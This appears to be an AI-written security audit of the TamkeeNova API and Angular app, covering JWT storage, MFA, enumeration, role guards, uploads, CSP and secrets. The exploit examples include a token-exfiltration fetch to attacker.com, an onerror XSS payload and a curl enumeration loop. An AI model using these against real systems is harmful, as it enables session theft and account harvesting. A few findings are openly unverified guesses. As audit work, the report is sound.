# PRIORITY SECURITY REVIEW — TamkeeNova HUB (Public-Internet Readiness)
**Date:** 2026-09-22 UTC  
**Branch audited:** `arena/01a0c6ee-tamkenova-hup-fandb` (fork of `bcfc1bb` `main`)  
**Scope:** `tamkeenova-api` (NestJS 12 + Prisma 6 + PostgreSQL + Supabase Storage + Gmail SMTP) + `tamkeenova-hub_anguler` (Angular 17 SPA)  
**Method:** Full static code review with attacker mindset + comparison to prior audit `SECURITY_AUDIT_REPORT.md` (2026-09-22) and `SYSTEM_DESIGN.md` ideal state  
**Audience:** Assume deployment to public internet tomorrow. Attackers: bots, script kiddies, malicious users, competitors, researchers, APT.

> **You asked to pay special attention to 11 areas and to verify if each is fully resolved or only partially mitigated. The Priority Verdict Table below answers that directly before the deep dive.**

---

## PRIORITY VERDICT TABLE (Your 11 Items)

| # | Priority Area | Status | Evidence Summary | Remaining Risk |
|---|---|---|---|---|
| **P-01** | **JWT stored in localStorage** | **❌ NOT RESOLVED — still vulnerable** | `tamkeenova-hub_anguler/src/core/services/auth.service.ts:82-84` `setSession()` stores `token` + `user` in `localStorage`; `getToken(): localStorage.getItem('token')` (111); `app.routes.ts:103-104` reads `localStorage` for routing; interceptor attaches `Authorization: Bearer ${token}` (auth.interceptor.ts). No `httpOnly` cookie alternative, no BFF. | Any XSS → `localStorage.getItem('token')` exfil, replay until expiry. Meta CSP mitigates but does not eliminate. **Partial mitigation only (CSP meta added).** |
| **P-02** | **Missing MFA for admin users** | **❌ NOT RESOLVED** | Grep `mfa|totp|2fa|authenticator` → 0 hits in `tamkeenova-api/src` and `tamkeenova-hub_anguler/src`. `users` table has no `mfa_*`, `totp_secret`, `recovery_codes`. `JwtAuthGuard` + `RolesGuard` only. No step-up for `ADMIN`/`SUPER_ADMIN`. | Phished ADMIN password = full takeover; no second factor. |
| **P-03** | **Account enumeration** | **⚠️ PARTIALLY MITIGATED (50%)** | **Fixed:** `AuthService.forgotPassword` (returns generic `If an account exists...` 311), `resendOtp` (returns same `OTP sent successfully` even if `!user || email_verified` 272). Login now generic `Invalid email or password` for all failures (360, 368). **NOT fixed:** `register()` still throws distinct `Email already exists` (26), `Username already exists` (33), `Phone number already exists` (40); `checkAvailability()` returns `{email_available: !email,...}` booleans (247) — public `GET /api/auth/availability?email=` enumerable, throttled but not gated. | Attackers can still harvest valid emails/usernames via registration + availability. |
| **P-04** | **Public file URLs & storage exposure** | **⚠️ PARTIALLY MITIGATED (40%)** | **Improved:** `StorageService.uploadFile()` now uses `safeStorageName(contentType)` → `randomUUID()+ext` (storage.service.ts:18-20), `upsert:false` (vs prior `true`), and `assertSafeImage()` for avatars/trainer images (magic bytes). **Still public:** `getPublicUrl(path)` returns permanent public URL (storage.service.ts:34); Supabase bucket `tamkeenova` is public — no private ACL, no `createSignedUrl()`, no expiry. URLs returned via `GET /api/students/u/:username`, `verify/certificate/:code`, `trainers/profile/:slug`, etc. | Any leaked/guessed URL = permanent access; scraping via APIs yields all URLs. No enumeration via filename now, but URL disclosure via API is trivial. |
| **P-05** | **Student APIs accessible by any authenticated user** | **❌ NOT RESOLVED** | `students.controller.ts` imports only `JwtAuthGuard` — 18 routes `@UseGuards(JwtAuthGuard)` with **no** `RolesGuard`/`@Roles('STUDENT')`. Example: `@Get('profile')`, `@Patch('profile')`, `@Post('enrollments')`, `@Get('trainers')` etc. Any `VOLUNTEER`/`EMPLOYEE`/`TRAINER` JWT can enroll, change student profile, search trainers. Trainers controller *is* correct (`@UseGuards(JwtAuthGuard,RolesGuard) @Roles('TRAINER')` for mutating). Inconsistent. | Horizontal privilege abuse: volunteer enrolls as student, pollutes metrics, accesses PII endpoints. |
| **P-06** | **Role enforcement consistency** | **⚠️ PARTIALLY MITIGATED (60%)** | **Good:** `admin.controller.ts:34-35` `@UseGuards(JwtAuthGuard,RolesGuard) @Roles('ADMIN','SUPER_ADMIN')` class-level; `trainers.controller.ts` has `RolesGuard` for all trainer mutations; `tasks.controller.ts:32` class-level `@UseGuards(JwtAuthGuard,RolesGuard)` + per-route `@Roles(...)` correct segregation. **Inconsistent:** `students.controller.ts` (no RolesGuard), `consultations.controller.ts` (only JwtAuthGuard, relies on service-level `student_id` vs `trainer.user_id` checks — works but no role gate), `corporate-requests.controller.ts` (only JwtAuthGuard), `notifications.controller.ts:13` class-level JwtAuthGuard only, `specializations.controller.ts` `POST request` only JwtAuthGuard, `verification.controller.ts` fully public (intended). | Defense in depth fails; service-layer checks are last line, not consistent. One missed ownership check = IDOR. |
| **P-07** | **Signed URL implementation** | **❌ NOT IMPLEMENTED** | Only `getPublicUrl()` used (storage.service.ts:34). `grep signedUrl|createSignedUrl` → 0. `safeStorageName()` exists but no `createSignedUrl(path, expiry)`, no Supabase `storage.from(...).createSignedUrl`, no middleware to gate access. `corporate-attachments`, `task-submissions`, `avatars` all public. | No ability to time-limit or permission-check file access. |
| **P-08** | **CSP effectiveness** | **⚠️ PARTIALLY MITIGATED (55%)** | **Improved:** `tamkeenova-hub_anguler/src/index.html:6` now has `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data: https:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; font-src 'self' https://fonts.gstatic.com ...; script-src 'self'; connect-src 'self' https: http://localhost:3000 ...; frame-ancestors 'none';">`. Backend `main.ts:18-22` adds `helmet({contentSecurityPolicy:false, frameguard:{action:'deny'}, hsts:{maxAge:15552000,...}})`. So frontend meta covers XSS, backend adds `X-Frame-Options:DENY`, `HSTS`, `X-Content-Type-Options:nosniff` (helmet defaults). **Gaps:** `contentSecurityPolicy:false` disables CSP header — relies on meta only (no `object-src 'none'`, `base-uri 'self'`, `form-action`, `upgrade-insecure-requests`), allows `connect-src https:` broad, header CSP missing for API JSON and for non-index.html routes; no `require-trusted-types`. | Stored XSS via review/comment would still be mitigated by Angular auto-escaping + `script-src 'self'` but inline event handlers via SVG not covered by meta alone; header CSP would be stronger. |
| **P-09** | **Token invalidation mechanisms** | **✅ MOSTLY RESOLVED (90%)** | `JwtAuthGuard` now **reloads user on every request** (`prisma.users.findUnique` select `is_active,email_verified,token_version` 40-53), rejects if inactive/unverified, checks `payload.tv !== user.token_version`. `auth.repository.ts:96` `updatePassword` bumps `token_version`; `students.repository.ts:81` same; `admin.repository.ts:84` `updateUserRole` bumps `token_version`, `updateUserActive` bumps when deactivating (`is_active? {is_active} : {is_active, token_version:increment}` 92-94). `AuthService.login` signs `tv: user.token_version` (382). `security-hardening.sql` adds `token_version`. **Gaps:** `updateContactInfo` (email change) does **not** bump `token_version` nor require re-verification; `updateUserActive` activating does not bump (arguably ok); no logout denylist; `JwtStrategy.validate` still returns DB-unchecked values (unused path). | 90% — session immortality largely fixed; email takeover gap remains. |
| **P-10** | **Rate limiting coverage** | **⚠️ PARTIALLY MITIGATED (60%)** | **Improved:** `app.module.ts:33` `ThrottlerModule.forRoot({limit:80, ttl:60000})` + `APP_GUARD ThrottlerGuard` global; `auth.controller.ts` per-route `@Throttle` — `register` 8/min, `register/volunteer` 8/min, `availability` 20/min, `verify-email` 10/min, `resend-otp` 3/min, `login` 8/min, `forgot-password` 5/min, `reset-password` 8/min. **Gaps:** No `@Throttle` on public scraping endpoints (`GET /api/trainers`, `GET /api/trainers/profile/:slug`, `GET /api/trainers/programs/all`, `GET /api/verify/certificate/:code`, `GET /api/verify/user/:username`, `GET /api/students/u/:username`, `GET /api/partners`, `GET /api/specializations`), no IP block, no CAPTCHA, no WAF; file uploads rely on global 80/min only. `otp attempt_count >=5` lock exists but per-OTP not per-IP. | Public catalog still trivially scrapable at 80 req/min per IP; brute-force OTP per-code not per-account throttled. |
| **P-11** | **WAF and bot protection gaps** | **❌ NOT RESOLVED** | No `cloudflare|waf|captcha|recaptcha|turnstile|bot` in codebase; no `vercel.json` WAF rules visible; no `CF-Connecting-IP`, no `X-Forwarded-For` trust config; no `express-rate-limit` beyond throttler; no proof of Cloudflare Bot Fight Mode / AWS WAF / Akamai. | Automated credential stuffing, scraping, OTP bombing feasible; detection only via Winston logs not SIEM. |

**Overall Priority Verdict: 1 fully/mostly resolved (P-09), 5 partially mitigated, 5 not resolved/implemented.**  
`SYSTEM_DESIGN.md` claims ideal state (MFA, private storage, allowlist, helmet, etc.) — **code review shows SYSTEM_DESIGN is aspirational, not actual.** Trust the code, not the doc.

---

## THREAT MODELING (PHASE 1)

### Assets
- **PII & auth secrets:** `users` (email, phone, username, password hash, bio, location, whatsapp, token_version), `email_otps` (hashed), `trainers`/`volunteers` applications, `consultations` (student phone/bio/certificates exposed to trainer), `corporate_requests` (company data + attachments), `certificates` (verification codes, recipient names), `task_submissions` (attachments), `notifications`, `activity_logs`.
- **High-value operations:** `PATCH /api/admin/users/:id/role`, `PATCH /api/admin/users/:id/status`, `POST /api/admin/certificates`, `PATCH /api/admin/trainers/:id/approve`, `POST /api/auth/login`, `POST /api/auth/register`, `PATCH /api/students/change-password`, `POST /api/tasks/:id/submit`.
- **Storage:** Supabase bucket `tamkeenova` prefixes: `avatars/`, `profile-images/`, `corporate-attachments/`, `task-submissions/`.
- **Infrastructure:** JWT secret (`JWT_SECRET`), Supabase service key (`SUPABASE_SECRET_KEY`), Gmail App Password (`MAIL_USER`/`MAIL_PASSWORD`), OTP pepper (`OTP_PEPPER || JWT_SECRET`).

### Trust Boundaries & Data Flows
```
[Browser Angular/Vercel] —HTTPS/CORS allowlist→ [NestJS API /api (Helmet, ThrottlerGuard, JwtAuthGuard, RolesGuard)] —Prisma→ [PostgreSQL]
                                      |                                |
                                      +—> Supabase Storage (public getPublicUrl) —> Browser (direct URL fetch)
                                      +—> Gmail SMTP (OTP mail)
                                      +—> Winston logs (logs/auth, logs/errors, logs/security)
Frontend: localStorage(token,user) → Authorization: Bearer → API
API: jwt.verify(JWT_SECRET) → DB reload (token_version, is_active, email_verified) → RolesGuard
```

**Trust boundaries:** Browser (untrusted) ↔ API (trusted but stateless JWT) ↔ DB (trusted) ↔ Supabase (trusted but public bucket) ↔ Mail (trusted but interceptable if mailbox compromised).

**Entry points:** All `POST /api/auth/*` (unauth), `GET /api/auth/availability`, `GET /api/trainers*`, `GET /api/verify/*`, `GET /api/students/u/:username`, `GET /api/partners`, `Upload endpoints` (`PATCH /api/students/avatar`, `POST /api/trainers/upload-profile-image`, `POST /api/corporate-requests/:id/attachments`, `POST /api/tasks/:id/submit`).

**Privileged operations:** Any `SUPER_ADMIN`-only role grant, user deactivation, trainer approval/suspension, certificate issuance/revocation, task creation/assignment, program visibility toggle.

### Risk Matrix (re-evaluated vs original 7.8)

| Dimension | Now | Δ | Notes |
|---|---|---|---|
| Authentication | 6.5 | -1.5 | OTP crypto fixed, lockout added, reset flow added; MFA still missing, localStorage still |
| Authorization | 5.5 | -2.0 | token_version fixed immortality, SUPER_ADMIN gate fixed; student RolesGuard still missing |
| Cryptography | 4.5 | -2.0 | `randomInt` OTP, bcrypt 12, PASSWORD_PATTERN; pepper fallback still |
| Injection | 2.5 | -0.5 | Prisma safe, no raw queries; stored XSS mitigated by CSP meta |
| Configuration | 5.0 | -3.5 | CORS allowlist, Helmet HSTS/frameguard, global throttler; WAF still missing, CSP header off |
| Data exposure | 5.5 | -1.5 | UUID filenames, but public URLs still; public profile APIs still open |
| Logging/monitoring | 5.0 | -1.0 | Winston + activity_logs; no brute-force alerts/SIEM |
| Supply chain | 4.0 | 0 | No change |
| **Composite** | **5.4 Medium-High** | **-2.4** | **Was 7.8 High** |

---

## AUTHENTICATION AUDIT (PHASE 2) — Evidence-Based

### What was FIXED since original audit
- **JWT immortality fixed:** `jwt-auth.guard.ts:40-60` reloads user every request, rejects inactive/unverified, checks `payload.tv` vs `user.token_version`. Previously guard only `jwt.verify` + copy `payload.role`. Now DB is source of truth.
  ```ts
  const user = await prisma.users.findUnique({where:{id:userId}, select:{id,email,role,is_active,email_verified,token_version}});
  if (!user || !user.is_active || !user.email_verified) throw Unauthorized;
  if (payload.tv !== user.token_version) throw Unauthorized;
  request.user = {sub:user.id,email:user.email,role:user.role};
  ```
  Token invalidation on: `auth.repository.updatePassword` (increments token_version), `students.repository.updatePassword` (increments), `admin.repository.updateUserRole` (increments), `admin.repository.updateUserActive` when deactivating (increments). Login signs `tv` (auth.service.ts:382).

- **OTP weak randomness fixed:** `otp.util.ts:3-5` now `randomInt(100000,1000000)` (CSPRNG). Previously `Math.random()`.
- **OTP storage fixed:** `hashOtp` SHA256 with pepper (`OTP_PEPPER || JWT_SECRET`), `otpMatches` compares hash; `email_otps` schema now has `purpose`, `attempt_count`. Previously plaintext.
- **OTP brute-force mitigated:** `consumeOtp` checks `attempt_count >=5` (auth.service.ts:278), `incrementOtpAttempts` on mismatch, `expires_at` 10 min, `invalidateOldOtps` on new issuance.
- **Password policy fixed:** `PASSWORD_PATTERN = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,128}$/` enforced on `register.dto.ts`, `register-volunteer.dto.ts`, `reset-password.dto.ts`, `change-password.dto.ts` via `@Matches(PASSWORD_PATTERN)`.
- **Account lockout added:** `auth.service.ts:362-368` checks `locked_until`, on bad password records `attempts+1`, `lockedUntil = attempts>=5 ? +15min : null`, clears on success.
- **Forgot/reset flow added (was missing):** `POST /api/auth/forgot-password` (generic response), `POST /api/auth/reset-password` with `PURPOSE PASSWORD_RESET`, `updatePassword` bumps `token_version`.
- **Resend OTP enumeration mitigated:** `resendOtp` returns generic success if `!user || email_verified` (does not reveal).
- **Login enumeration mitigated:** login returns generic `Invalid email or password` for all failures including locked/unverified/inactive.

### What REMAINS BROKEN / PARTIAL

**P-01 JWT in localStorage (High, CVSS 8.0 if XSS)**
- **File:** `tamkeenova-hub_anguler/src/core/services/auth.service.ts:82-84` `setSession()`; `auth.interceptor.ts:9` attaches header; `app.routes.ts:103` reads token.
- **Exploit:** Any XSS (stored comment, future `innerHTML`, compromised CDN font-awesome) → `fetch('https://attacker.com?token='+localStorage.getItem('token'))` → attacker replays `Authorization: Bearer`. CSP `script-src 'self'` helps but not if attacker injects `<img onerror>` via SVG or via CSS injection.
- **Fix exact code:**
  ```ts
  // Backend: set httpOnly Secure SameSite cookie instead of returning token
  // auth.controller.ts -> @Res({passthrough:true}) res.cookie('__Host-token', accessToken, {httpOnly:true, secure:true, sameSite:'strict', maxAge: 3600*1000, path:'/'})
  // Frontend: remove localStorage; rely on cookie (withCredentials:true)
  // OR BFF pattern: Next/Nest BFF stores token, frontend never sees it
  // CSP: enable header helmet({contentSecurityPolicy:{directives:{defaultSrc:["'self'"], scriptSrc:["'self'"], objectSrc:["'none'"], baseUri:["'self'"]}}})
  ```
- **CVSS 8.0, Priority P0.** Status: **Partially mitigated (CSP meta only).**

**P-02 Missing MFA (High, CVSS 7.2 for admin)**
- No TOTP, no step-up. Admin login same as student. Password policy helps but phishing remains.
- **Fix:** Add `users.mfa_secret`, `mfa_enabled`, `POST /api/auth/mfa/setup`, `POST /api/auth/mfa/verify`, require `mfa_verified` claim for `ADMIN`/`SUPER_ADMIN` routes; enforce via `MfaGuard`.
- **Status: Not resolved.**

**P-03 Enumeration (Medium-High)**
- Register leaks: `auth.service.ts:26-40` distinct throws. Availability endpoint leaks booleans. Test: `POST /api/auth/register {email:"admin@example.com"} → 400 "Email already exists"` vs 201.
- **Fix:** Register return generic `Check your email for verification` regardless of dup + send email if exists? Or return same 201 but background job; availability should require auth+CAPTCHA or be removed.
- **Status: Partially mitigated.**

**Email change without re-verification (High)**
- `students.service.ts:updateContactInfo` → `students.repository.updateContactInfo` directly updates `email` without OTP on old/new, no `token_version` bump. Attacker with stolen session changes `email` then `resetPassword` via new email.
- **Fix:** Require `PATCH /api/students/contact-info` to send OTP to old+new emails; bump `token_version` and set `email_verified=false` until new OTP verified.
- **Status: Not resolved.** (Improved but not fixed).

**OTP legacy plaintext fallback**
- `otp.util.ts:11` `if (stored.length===6 && stored===plain) return true` — if DB contains legacy plaintext 6-digit OTPs, attacker who dumps `email_otps` can use them directly, or if attacker can force old code path. Should be removed after migration.
- **Status: Partially mitigated (legacy compat).**

---

## AUTHORIZATION AUDIT (PHASE 3) — Every Endpoint

| Route | Required Role (intended) | Actual Enforced | Bypass? | File |
|---|---|---|---|---|
| `PATCH /api/admin/users/:id/role` | SUPER_ADMIN only for ADMIN/SUPER_ADMIN | **FIXED** `admin.service.ts:89-93` checks `actor.role !== SUPER_ADMIN` for privileged | No | admin.service.ts |
| `PATCH /api/admin/users/:id/status` | ADMIN/SUPER_ADMIN | `JwtAuthGuard+RolesGuard` ADMIN/SUPER_ADMIN + `token_version` bump on deactivate | No (but activating doesn't bump — arguable) | admin.service.ts |
| `GET /api/admin/*` | ADMIN/SUPER_ADMIN | Same class-level guard | No | admin.controller.ts |
| `POST /api/trainers/programs` | TRAINER | `Jwt+RolesGuard TRAINER` + checks `getTrainerProfile(user.sub)` exists | No | trainers.controller.ts:68 |
| `PUT /api/trainers/programs/:id` | TRAINER owner | Checks `program.trainer_id !== trainer.id → Unauthorized` | No | trainers.service.ts:101 |
| `GET /api/trainers/me` etc. | TRAINER | RolesGuard | No | trainers.controller |
| `GET /api/trainers` | public | none (intended catalog) | **Scrapable** | trainers.controller:240 |
| `GET /api/trainers/profile/:slug` | public | none | **Scrapable** | trainers.controller |
| `GET /api/trainers/programs/all` | public | none | **Scrapable** | trainers.controller |
| `GET /api/students/profile` | STUDENT | **Only JwtAuthGuard** — should be `@Roles('STUDENT')` | **YES BFLA** — any role passes | students.controller:54 |
| `PATCH /api/students/profile` | STUDENT | Only JwtAuthGuard | **YES** | students.controller:65 |
| `PATCH /api/students/avatar` | STUDENT | Only JwtAuthGuard (+assertSafeImage) | **YES** volunteer can upload to student avatar endpoint (self only but role wrong) | students.controller:79 |
| `POST /api/students/enrollments` | STUDENT | Only JwtAuthGuard | **YES** volunteer/employee can enroll → business logic abuse | students.controller:163 |
| `GET /api/students/trainers` | STUDENT? | Only JwtAuthGuard | **YES** any auth can search trainers (maybe intended authenticated search) but spec says student API | students.controller:139 |
| `GET /api/students/u/:username` | public | none — public profile | **Scrapable PII** | students.controller:33 |
| `GET /api/verify/certificate/:code` | public | none | **Scrapable** | verification.controller |
| `GET /api/verify/user/:username` | public | none | **Scrapable** | verification.controller |
| `POST /api/consultations` | any auth (student) | Jwt only | Service checks ownership but no role — volunteer can create consultation as student | consultations.controller |
| `PATCH /api/consultations/:id/status` | trainer owner | Jwt only + `consultation.trainers.user_id !== trainerUserId → Forbidden` | Mitigated via service check | consultations.service |
| `POST /api/corporate-requests` | any auth | Jwt only | Volunteer can file corporate request (maybe allowed) | — |
| `POST /api/tasks` | ADMIN/SUPER_ADMIN | Jwt+RolesGuard ADMIN/SUPER_ADMIN | No | tasks.controller:62 |
| `PATCH /api/tasks/:id/start` | EMPLOYEE/VOLUNTEER assignee | RolesGuard + assignment check | No | tasks.controller |

**Attack examples:**

- **BFLA 1 — Volunteer enrolls as student:** `POST /api/students/enrollments` with volunteer JWT `{role:VOLUNTEER}` → succeeds, creates enrollment, counts toward `total_students`.
- **BFLA 2 — Employee changes student profile:** `PATCH /api/students/profile` with employee JWT → updates own `users` row (self) but endpoint meant for students; no check.
- **Horizontal:** `GET /api/corporate-requests/:id` checks `requester_id !== userId → Forbidden` (good). `GET /api/students/enrollments/:id` checks ownership (good). `POST /api/consultations/:id/review` checks `consultation.student_id !== studentId` (good). So some ownership checks exist, but missing role gates are defense-in-depth failure.
- **Vertical super-admin:** Previously `any ADMIN could promote to SUPER_ADMIN` → now fixed: `admin.service.ts:89 privileged && actor.role !== SUPER_ADMIN → BadRequest`. Also prevents demoting SUPER_ADMIN.

**Recommendation:** Add `@UseGuards(JwtAuthGuard,RolesGuard) @Roles('STUDENT')` to all `students.controller.ts` routes except `GET u/:username` and `verifyCertificate`. Similarly gate `consultations` student vs trainer routes.

---

## API SECURITY AUDIT (PHASE 4)

- **Missing authorization:** Students APIs (above). **Missing validation:** Partners `create(@Body() dto: PartnerDto)` — now typed correctly (was `any` per old report) → **FIXED** via `PartnerDto` class with ValidationPipe whitelist.
- **Missing ownership:** Corporate `uploadAttachment` correctly checks `request.requester_id !== userId → Forbidden` (corporate-requests.service.ts:30) — good. Task comments/details check `task_assignees` vs role.
- **Rate limit gaps:** Auth throttled, but search/verify/public not. `GET /api/students/trainers?search=` can be scraped at global 80/min per IP; with botnet → full catalog in minutes.
- **Enumeration vectors:** `checkAvailability` (20/min), `register` dup messages, `verify certificate` distinct 404 vs 200 (predictable `TAM-` + 8 hex 32-bit helper `generateVerificationCode()` legacy vs 8 random bytes for admin certs — still brute-forceable at 4B space without rate limit).
- **Information disclosure:** `GlobalExceptionFilter` now correctly strips infrastructure details (`P1001|database|supabase` → `SERVICE_UNAVAILABLE`) and logs with `LoggerService` (good). Status codes still leak `401` vs `403` vs `400` for enumeration though.
- **Parameter tampering:** `@IsUUID` on `user_id` in `IssueCertificateDto`, `@IsIn(['TRAINING','VOLUNTEER'])`, `training_hours` 1-100k, `issued_at` regex — good strict validation. `safeStorageName` prevents path traversal via `originalname`.
- **Mass assignment:** `ValidationPipe whitelist:true + forbidNonWhitelisted:true` global (main.ts:51) — strong. No dynamic `req.body` passthrough observed except partners now fixed.
- **Business logic abuse:** Trainer `discount_percentage` default 0, no max; enrollment re-enroll after CANCELLED → `cancelEnrollment` called then `createEnrollment` (students.service.ts:119) — attacker could cycle enroll/cancel to inflate `enrolled_count`? Not critical.

**Exploit paths:**
- Scrape: `curl https://api/api/trainers` → paginated? Actually no pagination limit on `getAllPublicTrainers`? Check trainers.service: `getAllPublicTrainers()` likely returns all without limit → DoS.
- Availability enumeration: `for email in list; do curl /api/auth/availability?email=$email; done` → harvest.

---

## BUSINESS LOGIC AUDIT (PHASE 5)

- **Enrollment abuse:** `enrollInProgram` checks `program.is_active` and existing `ACTIVE` → Conflict, else if `CANCELLED/COMPLETED` cancels then re-creates (students.service.ts:111). No payment, so free enrollment — volunteer can enroll unlimited programs.
- **Review abuse:** `createReview` `@UseGuards(JwtAuthGuard)` only (trainers.controller:203) — any auth can review any trainer, no check that reviewer was enrolled/consulted. `editReview/deleteReview` correctly scope by `student_id` (students.service.ts:298). So attacker can spam reviews.
- **Certificate abuse:** `IssueCertificateDto` requires `user_id`, `training_hours`, `recipient_name_*`, `program_name_*`. No check that user actually completed program. Admin can issue arbitrary certificates for any user (intended admin privilege but fraud risk). `partner_logos` limit 4, data_url 90k base64 PNG — possible DoS via large base64 but limited.
- **Trainer approval abuse:** `approveTrainer` any admin can approve, no second admin review. No SLA.
- **Task abuse:** `createTask` requires at least one assignee, checks `TEAM_ROLES` (EMPLOYEE/VOLUNTEER) — good. `task_order` locking: `isLocked` ensures sequential approval. `submitTask` allows multiple files (10×10MB =100MB) per submission, stored public, no virus scan.
- **Corporate request abuse:** No limit on number of requests per user; could spam admin notifications.

---

## FILE UPLOAD AUDIT (PHASE 6)

**Fixed for avatars:** `assertSafeImage` (file-upload.ts) magic-byte sniff JPEG/PNG/WEBP, checks both `file.mimetype` and sniffed mime, size 5MB, UUID filename, `upsert:false`. Used in `students.service.uploadAvatar` and `trainers.service.uploadProfileImage`.

**Still vulnerable for other uploads:**
- `CorporateRequestsService.uploadAttachment` (corporate-requests.service.ts:45-67) **only** checks `file.mimetype` attacker-controlled allowlist (`application/pdf`, `msword`, `...docx`, `image/*`), size 10MB, then `storageService.uploadFile(... file.mimetype)` — no magic bytes, so attacker can spoof `Content-Type: image/png` while sending `PDF` or `HTML` with XSS payload. Stored URL served with that content-type → potential XSS if rendered in browser.
- `TasksService.submitTask` (tasks.service.ts:449-464) loops `files` → `storageService.uploadFile('task-submissions', file.originalname, file.buffer, file.mimetype)` — **no** `assertSafeImage` nor magic check, no allowlist, size per file 10MB (from interceptor) but no total limit, no virus scan, `file_type: file.mimetype` stored attacker-controlled.
- `Trainer` `createAvailability` no file, but `trainer.documents[].file_url` is URL supplied by user (`@IsUrl()` only) — can be `https://evil.com/malware.pdf` or `http://169.254.169.254` (SSRF if backend fetched, currently just stored). Rendering that URL on frontend could lead to phishing.
- **SVG/polyglot/zip bomb:** SVG not allowed for avatars (good, blocks SVG XSS). But corporate/task allow `image/png` etc. — an SVG masquerading as PNG via header could bypass mimetype check (since corporate checks mimetype only). However task uploads via `FileInterceptor('files',10, {limits:{fileSize:10MB}})` — 10 files =100MB memory before processing, possible DoS.

**Can attacker upload malicious file?** Yes, via corporate/task endpoints with spoofed mimetype.  
**Can attacker execute code?** No direct code exec (no server-side execution of uploads), but **stored XSS** if `Content-Type` is `image/svg+xml` spoofed as `image/png` and later served with `Content-Type: image/png` browser may sniff? Supabase serves with stored content-type, so attacker could upload `shell.html` with `mimetype image/png` — browser might render as image not HTML, low risk. But SVG with `<script>` served as `image/png` not executed. So XSS via file less likely but still MIME sniff risk.

**Recommend:** Use `assertSafeImage` for image uploads, magic sniff for PDF (`%PDF`), limit docs, generate UUID, store with `contentType` sniffed not client supplied, virus scan (ClamAV), set `Content-Disposition: attachment`.

---

## XSS AUDIT (PHASE 7)

- **Frontend grep:** `innerHTML`, `bypassSecurityTrustHtml`, `dangerouslySetInnerHTML` → **0 hits** in `tamkeenova-hub_anguler/src` (except `Design_System.html` doc). Good.
- **Angular escaping:** Default interpolation `{{ }}` escapes HTML. No `[innerHTML]` binding observed in core features. Risk low.
- **Stored XSS vectors:** `trainer bio_ar/bio_en`, `program description`, `task comments` (`tasks.service.addComment` stores `dto.body` without sanitization), `consultation title/description`, `corporate service_description`. These are rendered via Angular `textContent` → safe, but if admin panel renders `trainer documents file_name` or `certificate recipient_name` without escaping, potential. `certificate-data.ts` validates `recipient_name` with `/[\u0000-\u001f\u007f\u202a-\u206e\u2066-\u2069]/` and trims — strong against bidi override. Partner `data_url` validates base64 PNG strict.
- **CSP:** Meta `script-src 'self'` blocks inline scripts, `style-src 'unsafe-inline'` needed for fonts, `frame-ancestors 'none'` blocks clickjacking. No `object-src`, so `object-src 'self'` fallback allows Flash? Should be `'none'`. No `base-uri` → base tag injection possible. `connect-src 'self' https: http://localhost:3000` is broad (`https:` allows any https endpoint — needed for Supabase, but could allow exfil to `https://attacker.com`).
- **Backend CSP header:** `helmet({contentSecurityPolicy:false})` disables header. API should return `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'` for JSON.
- **Proof-of-concept payload:** `POST /api/tasks/:id/comments {body: "<img src=x onerror=alert(document.domain)>"}`
  - Angular renders as text → no exec. But if anywhere uses `[innerHTML]="comment.body"` → exec. Search shows none today, but future risk.
- **Worst case:** XSS via compromised `cdnjs.cloudflare.com` (FontAwesome) — has SRI `integrity` attribute (index.html:14) — good! Funds? Google Fonts preconnect no SRI but fonts less risky.

**Verdict:** XSS risk **LOW now** due to Angular escaping + CSP meta + strict cert validation, but **localStorage token theft consequence is HIGH** if XSS ever occurs. Need `httpOnly` cookie + Trusted Types.

---

## CSRF AUDIT (PHASE 8)

- **Cookie usage:** JWT **not** in cookie, only `Authorization` header. `auth.interceptor` does not send cookies. No `SameSite` cookie.
- **CSRF tokens:** None, but not needed for bearer header — browser cannot auto-attach `Authorization` cross-site.
- **SameSite policy:** N/A currently. If migrating to httpOnly cookie, must set `SameSite=Strict` + `CSRF token` or `SameSite` sufficient for state-changing.
- **State-changing requests:** `POST /api/auth/*` are unauth, not CSRF target. Authenticated `PATCH /api/students/profile` uses `Authorization` header → attacker site cannot set that header without CORS preflight (blocked unless `isAllowedOrigin` misconfig). `isAllowedOrigin` now allowlist, so CSRF via `fetch` from evil origin would be blocked CORS unless attacker exploits `no-cors` form? Forms cannot set `Authorization` header, so safe.
- **Risk:** Current design **CSRF-safe** (bearer). Future cookie migration without CSRF token would introduce vulnerability. Note `helmet` sets no `CSRF` protection today; if cookies added, add `csurf` or double-submit.

---

## DATABASE SECURITY AUDIT (PHASE 9)

- **Prisma usage:** All queries via Prisma parameterized, no `$queryRaw`, no `executeRaw`, no dynamic SQL. `grep queryRaw|executeRaw` → 0. SQLi risk **LOW**.
- **Dynamic queries:** `where: { OR: [{full_name: {contains: search, mode: 'insensitive'}}]}` — Prisma handles parameterization; `contains` with `mode` is safe.
- **Migrations:** `prisma/security-hardening.sql` adds `token_version`, `purpose`, `attempt_count` — good. No raw migration that creates superuser.
- **Data leaks:** `students.repository.getProfile` selects limited fields (no password). `admin.repository.getUsers` selects safe fields. `verification.repository.getUserForVerification` selects only public fields but still exposes `total_training_hours`, certificates, trainers — intended public profile but could be scraped.
- **Sensitive columns:** `users.password` (bcrypt), `email_otps.otp_code` (now hashed), `corporate_requests` contains company data. No encryption at rest beyond PG.
- **Missing constraints:** `users.email unique`, `phone unique`, `username unique` — good. `email_otps` no unique per user+purpose+is_used, but logic handles. No `CHECK` for `training_hours` in DB, only DTO.
- **Indexes:** `idx_users_email`, `idx_email_otps_user_id`, `idx_certificates_verification` — good for perf, not security.

---

## SECRET MANAGEMENT AUDIT (PHASE 10)

- **.env usage:** No `.env` committed (good). `process.env.JWT_SECRET!` asserted non-null, will throw if missing. `ConfigModule.forRoot({isGlobal:true})` loads env. No `.env.example` visible.
- **JWT secrets:** `JwtModule.registerAsync({secret: config.getOrThrow('JWT_SECRET')})` — must be strong (≥256-bit). No rotation mechanism; `token_version` mitigates but secret rotation still requires restart and invalidates all tokens until `JWT_EXPIRES_IN` expiry. No `JWT_SECRET` strength check in code.
- **API keys:** `SUPABASE_URL!` + `SUPABASE_SECRET_KEY!` (service_role) — highly privileged! Used in `StorageService` and `TestController`. Service key can bypass RLS. Should be vaulted, not env-only.
- **OTP pepper:** `OTP_PEPPER || JWT_SECRET || 'otp'` — fallback to `JWT_SECRET` if `OTP_PEPPER` unset, and to `'otp'` if both unset (weak). Should require `OTP_PEPPER` 32+ random.
